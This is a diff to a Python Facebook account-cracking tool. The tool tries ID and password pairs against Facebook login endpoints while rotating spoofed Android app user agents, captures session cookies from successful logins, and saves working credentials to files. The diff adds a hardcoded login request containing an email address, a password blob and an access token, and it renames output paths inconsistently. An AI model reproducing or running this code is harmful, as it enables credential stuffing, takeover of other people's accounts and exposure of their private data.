@@ -9,7 +9,29 @@ from time import localtime as lt
 from pip._vendor import requests
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import requests
+import json
 
+url = "https://graph.facebook.com/auth/login"
+
+payload = {
+  "locale": "ar_AR",
+  "format": "json",
+  "email": "turbo1dturbo1t@gmail.com",
+  "password": "#PWD_REACTNATIVE:2:1771158980:AUBP/yH+qv/s3YY5jscAAWXXPm8hXHF1LcK5Gvjj1nJJ4uAQIOtVWqfgENu6NkXH5YGZ5e/+6Q8nFbCRVy8+i+BkBpXC0P1df6+ry8OJku2GI2kMYsANlkGsmOYQ0xlvrtjLygiKZQCrwkpdRXkEzGaqgOxUolXoHpbOaK9lDX8E1LwokyuWWau/HBTXz+7sAHbKeAqbKFpNYbKh6ZzW8Aus5LgZtHjnT29CCLlGTOks63RH5Kqs0XnIb7Rp7VxTE14+LD3o6SWD1i7O8US6Gl6B6KC6TCDu0r8nBxIyYvJkYgldr8josGVGCPm+3GCG9u1W5lOMvKEf6LQJKMc3d6Dc3w3XEhjOvNvc3uM0s1Oj+sYVu/pm5C6EDwHHUUNbFOwd8qq1mx2f",
+  "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
+  "generate_session_cookies": 1
+}
+
+headers = {
+  'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 15; RMX5566 Build/AP3A.240617.008) [FBAN/ViewpointsForAndroid;FBAV/286.0.0.1.109;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/realme;FBBD/realme;FBDV/RMX5566;FBSV/15;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1468};FB_FW/1;]",
+  'Accept-Encoding': "gzip",
+  'content-type': "application/json;charset=utf-8"
+}
+
+response = requests.post(url, data=json.dumps(payload), headers=headers)
+
+print(response.text)
 #----------------\<-COLOR->/----------------#
 G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
 Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
@@ -134,7 +156,7 @@ def _____UpDaTe_S2_____():
     fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
     bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
     agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
-    iphone3 = random.choice(['FBAN/FB4A;FBAV/364.1.0.25.132;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/312816921;FBCR/Chatr Mobile;FBMF/Nokia;FBBD/nokia;FBDV/TA-1270;FBSV/15.9.0;FBCA/arm64-v8a:null;FBDM/{density=1.25,width=999,height=730};FB_FW/1;]"+"[FBAN/FB4A;FBAV/275.0.0.49.127;FBPN/com.facebook.katana;FBLC/en_US;FBBV/221372446;FBCR/Ting;FBMF/OnePlus;FBBD/oneplus;FBDV/DN2106;FBSV/11.6.3;FBCA/x86:armeabi-v7a;FBDM/{density=2.25,width=529,height=2473};]"+"[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817218;FBDM/{density=1.5,width=779,height=1983};FBLC/en_US;FBCR/Boost Infinite;FBMF/Itel;FBBD/itel;FBPN/com.facebook.katana;FBDV/1507;FBSV/13.5.5;FBCA/x86_64:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/128.0.0.25.68;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/61316310;FBCR/Simplytel;FBMF/Motorola;FBBD/motorola;FBDV/XT2011-2;FBSV/5.9.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.25,width=857,height=762};]"+"[FBAN/FB4A;FBAV/248.1.0.44.116;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/184540721;FBCR/Vodafone Red;FBMF/Asus;FBBD/asus;FBDV/ZE620KL;FBSV/10.7.0;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.8,width=1164,height=2005};]"+"[FBAN/FB4A;FBAV/126.0.0.21.77;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/59748977;FBCR/Fizz Mobile;FBMF/Lenovo;FBBD/lenovo;FBDV/K5 Pro;FBSV/6.6.4;FBCA/x86:armeabi-v7a;FBDM/{density=1.25,width=668,height=999};FB_FW/1;FBRV/59875038;]"+"[FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/311215741;FBDM/{density=1.5,width=821,height=1334};FBLC/en_AU;FBRV/311571742;FB_FW/2;FBCR/Vaya Mobile;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/CPH2407;FBSV/14.6.0;FBOP/1;FBCA/x86_64:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/394.1.0.51.107;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/318819992;FBCR/Zoomer Wireless;FBMF/Amazon;FBBD/amazon;FBDV/B07KX1F1L6;FBSV/14.8.3;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.2506,width=457,height=2490};FB_FW/1;FBRV/319214078;]"+"[FBAN/FB4A;FBAV/156.0.0.36.100;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/88997456;FBCR/Optus;FBMF/LG;FBBD/lg;FBDV/LGD337;FBSV/11.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.0,width=1358,height=1938};]"+"[FBAN/FB4A;FBAV/72.0.0.22.69;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/27550270;FBCR/Virgin Mobile Canada;FBMF/Wiko;FBBD/wiko;FBDV/W-R;FBSV/6.6.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.2506,width=1219,height=2263};FB_FW/1;FBRV/27622369;]"+"[FBAN/FB4A;FBAV/290.0.0.44.121;FBBV/248231979;FBDM/{density=1.5,width=1385,height=1715};FBLC/en_US;FBRV/248522064;FB_FW/2;FBCR/Mint Mobile;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J337P;FBSV/8.5.2;FBOP/20;FBCA/x86_64:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/147.0.0.44.75;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/76755482;FBCR/Winsim;FBMF/Vivo;FBBD/vivo;FBDV/Y33e;FBSV/8.5.5;FBCA/x86:armeabi-v7a;FBDM/{density=3.75,width=1379,height=2152};FB_FW/1;FBRV/76902569;]"+"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=1282,height=948};FBLC/en_GB;FBCR/Three UK;FBMF/Tecno;FBBD/tecno;FBPN/com.facebook.katana;FBDV/CK2;FBSV/7.5.1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/397.0.0.23.404;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/420441389;FBCR/Amaysim;FBMF/Amazon;FBBD/amazon;FBDV/B09MYNR9HD;FBSV/13.5.0;FBCA/x86:arm64-v8a:armeabi-v7a;FBDM/{density=2.75,width=932,height=1827};FB_FW/1;FBRV/420838403;]"+"[FBAN/FB4A;FBAV/39.0.0.0.73;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/12686058;FBCR/TeleChoice;FBMF/Google;FBBD/google;FBDV/X6D2;FBSV/5.6.2;FBCA/x86_64:armeabi-v7a;FBDM/{density=2.2,width=871,height=2497};FB_FW/1;]"+"[FBAN/FB4A;FBAV/354.0.0.22.110;FBBV/310813944;FBDM/{density=1.0,width=687,height=1890};FBLC/en_CA;FBCR/Chatr Mobile;FBMF/Lenovo;FBBD/lenovo;FBPN/com.facebook.katana;FBDV/A6;FBSV/15.7.1;FBCA/x86:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/148.0.0.45.62;FBBV/77861642;FBDM/{density=3.5,width=1375,height=2278};FBLC/en_GB;FBRV/78009671;FB_FW/2;FBCR/Spectra Mobile;FBMF/Asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZE553KL;FBSV/8.5.0;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/174.0.0.54.96;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/111133949;FBCR/Drillisch Online;FBMF/Itel;FBBD/itel;FBDV/P28;FBSV/9.9.5;FBCA/arm64-v8a:;FBDM/{density=3.75,width=1020,height=1782};FB_FW/1;FBRV/111308008;]"+"[FBAN/FB4A;FBAV/406.0.0.26.90;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/440212037;FBCR/Daisy Group;FBMF/Sony;FBBD/sony;FBDV/F3311;FBSV/12.9.3;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.8,width=928,height=2381};]"+"[FBAN/FB4A;FBAV/39.0.0.0.73;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/12686136;FBCR/Simply Mobile;FBMF/Tecno;FBBD/tecno;FBDV/PD6;FBSV/6.6.3;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=1.8,width=871,height=1924};FB_FW/1;]"+"[FBAN/FB4A;FBAV/168.0.0.35.90;FBBV/103430910;FBDM/{density=2.29375,width=487,height=768};FBLC/fr_CA;FBRV/103598936;FB_FW/2;FBCR/7-Eleven SpeakOut Wireless;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/DN2108;FBSV/8.6.2;FBOP/19;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/178.0.0.57.86;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/115496535;FBCR/O2 Priority;FBMF/Tecno;FBBD/tecno;FBDV/KF3;FBSV/10.7.2;FBCA/arm64-v8a:null;FBDM/{density=1.8,width=569,height=1850};FB_FW/1;FBRV/115674624;]"+"[FBAN/FB4A;FBAV/138.0.0.16.93;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/68853981;FBCR/Exetel;FBMF/Lava;FBBD/lava;FBDV/A990;FBSV/11.8.1;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.8,width=1117,height=1625};FB_FW/1;FBRV/68991989;]]'])
+    iphone3 = random.choice('[FBAN/FB4A;FBAV/152.0.0.34.136;FBBV/82833102;FBDM/{density=4.0,width=944,height=1983};FBLC/en_US;FBCR/H2O Wireless;FBMF/Asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/AI2203;FBSV/10.7.0;FBCA/x86_64:x86:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/34.0.0.0.242;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/10009614;FBCR/PC Mobile;FBMF/Realme;FBBD/realme;FBDV/RMX3721;FBSV/5.8.1;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.5,width=870,height=1794};FB_FW/1;FBRV/10043642;]"+"[FBAN/FB4A;FBAV/382.0.0.33.111;FBBV/316416485;FBDM/{density=2.75,width=1242,height=1752};FBLC/en_US;FBRV/316798559;FB_FW/2;FBCR/MetroPCS;FBMF/Tecno;FBBD/tecno;FBPN/com.facebook.katana;FBDV/TB20;FBSV/13.6.5;FBOP/19;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/460.0.0.0.52;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/451006355;FBCR/Otelo;FBMF/Huawei;FBBD/huawei;FBDV/BLA-L29;FBSV/15.7.3;FBCA/arm64-v8a:;FBDM/{density=3.75,width=934,height=734};FB_FW/1;]"+"[FBAN/FB4A;FBAV/103.0.0.20.72;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/43868207;FBCR/Telekom Family Card;FBMF/Vivo;FBBD/vivo;FBDV/S1;FBSV/5.5.0;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=918,height=899};FB_FW/1;]"+"[FBAN/FB4A;FBAV/55.0.0.18.66;FBBV/17676094;FBDM/{density=1.25,width=1351,height=2476};FBLC/en_AU;FBRV/17731121;FB_FW/2;FBCR/Exetel;FBMF/Sony;FBBD/sony;FBPN/com.facebook.katana;FBDV/XQ-BA32;FBSV/6.9.1;FBOP/1;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372446;FBDM/{density=2.9,width=1436,height=1158};FBLC/en_AU;FBRV/221647452;FB_FW/2;FBCR/Southern Phone;FBMF/Sony;FBBD/sony;FBPN/com.facebook.katana;FBDV/XQ-BQ52;FBSV/8.8.3;FBOP/1;FBCA/x86:arm64-v8a:armeabi-v7a;]"+"[FBAN/FB4A;FBAV/110.0.0.15.69;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/49078465;FBCR/TPG Telecom;FBMF/Wiko;FBBD/wiko;FBDV/W-Y40;FBSV/6.5.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=3.8,width=1108,height=857};FB_FW/1;]"+"[FBAN/FB4A;FBAV/29.0.0.0.5;FBPN/com.facebook.katana;FBLC/en_CA;FBBV/7108191;FBCR/Videotron;FBMF/OPPO;FBBD/oppo;FBDV/CPH2554;FBSV/7.6.4;FBCA/x86_64:arm64-v8a:armeabi-v7a;FBDM/{density=2.0,width=635,height=1691};FB_FW/1;FBRV/7137261;]"+"[FBAN/FB4A;FBAV/62.0.0.42.77;FBPN/com.facebook.katana;FBLC/fr_CA;FBBV/21376152;FBCR/Rogers Sans-fil;FBMF/Sony;FBBD/sony;FBDV/F3311;FBSV/7.5.3;FBCA/x86:armeabi-v7a;FBDM/{density=1.0,width=1165,height=2560};FB_FW/1;FBRV/21438230;]"+"[FBAN/FB4A;FBAV/337.0.0.32.118;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/287416593;FBCR/Netzclub;FBMF/Sony;FBBD/sony;FBDV/C6603;FBSV/14.9.5;FBCA/arm64-v8a:;FBDM/{density=1.0,width=525,height=2102};]')
     ___Noor_on_Fire___ = ''+str(iphone3)+' '+str(agent3)
     return ___Noor_on_Fire___
 #----------------\<-VERSION->/----------------#
@@ -144,9 +166,14 @@ __COUNTRYS__ = af['country'].upper()
 xlinex = (f"{G}━"*56)
 #----------------\<-LOGO->/----------------#
 logo = f"""
-{G}   ┏━┓┏━╸┏━┓   ╻ ╻╺┳┓  ●{W}  DEVELOPER {xpxx} NOOR{G}-{W}404
-{W}   ┗━┓┣╸ ┣━┫{G}╺━╸{W}┏╋┛ ┃┃{G}  ●{W}  STATUS    {xpxx} FREE
-{G}   ┗━┛┗━╸╹ ╹   ╹ ╹╺┻┛  ●{W}  VERSION   {xpxx} V{G}/{W}{version}
+{G}                        
+
+░▀█▀░▀█▀░█▀▀░█▀▀░█▀▄░░
+░░█░░░█░░█░█░█▀▀░█▀▄░░
+░░▀░░▀▀▀░▀▀▀░▀▀▀░▀░▀░░
+                                ●{W}  DEVELOPER {xpxx} NOOR{G}-{W}2026
+{W}                              {G}  ●{W}  STATUS    {xpxx} FREE
+{G}                                ●{W}  VERSION   {xpxx} V{G}/{W}{version}
 {xlinex}
 {W}         👑 MIND IT NOTHING IS IMPOSSIBLE 👑
 {xlinex}
@@ -200,7 +227,7 @@ class __SEAXNOOR__:
     #----------------\<-FILE-MENU->/----------------#
     def __FILEX__(self) -> None:
         __CLEAR__()
-        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}SEA.txt {G}/{W}OR{G}/{W} SEA.txt ")
+        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}zax.txt {G}/{W}OR{G}/{W} zaz.txt ")
         __LINE__()
         __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
         try:
@@ -350,7 +377,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M1{G}]>'
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M1{G}]>'
                 f'{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
@@ -437,7 +464,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -445,7 +472,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/zaz-XD/FILE/SEA-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M1 : {ids}|{pas}|{cookie}"
@@ -454,15 +481,15 @@ class __SEAXNOOR__:
 
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}zaz-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
 
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}zaz-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -485,7 +512,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -567,7 +594,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -575,7 +602,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/zaz-XD/FILE/zaz-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M2 : {ids}|{pas}|{cookie}"
@@ -583,14 +610,14 @@ class __SEAXNOOR__:
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}zaz-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}zaz-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/zaz-XD/FILE/zaz-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -613,7 +640,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M3{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M3{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -691,7 +718,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -699,7 +726,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/zax-XD/FILE/zaz-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M3 : {ids}|{pas}|{cookie}"
@@ -707,14 +734,14 @@ class __SEAXNOOR__:
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}zaz-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/zaz-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}zax-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/zaz-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -736,7 +763,7 @@ class __SEAXNOOR__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{G}<[{W}SEA{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M4{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
+                f'\r{xp}{W}-{G}<[{W}zaz{G}-{W}XD{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M4{G}]>{W}-{G}<[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -806,7 +833,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}zaz-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -814,7 +841,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SEA-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/zaz-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M4 : {ids}|{pas}|{cookie}"
@@ -823,13 +850,13 @@ class __SEAXNOOR__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/zaz-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error_msg']:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SEA-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/zaz-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
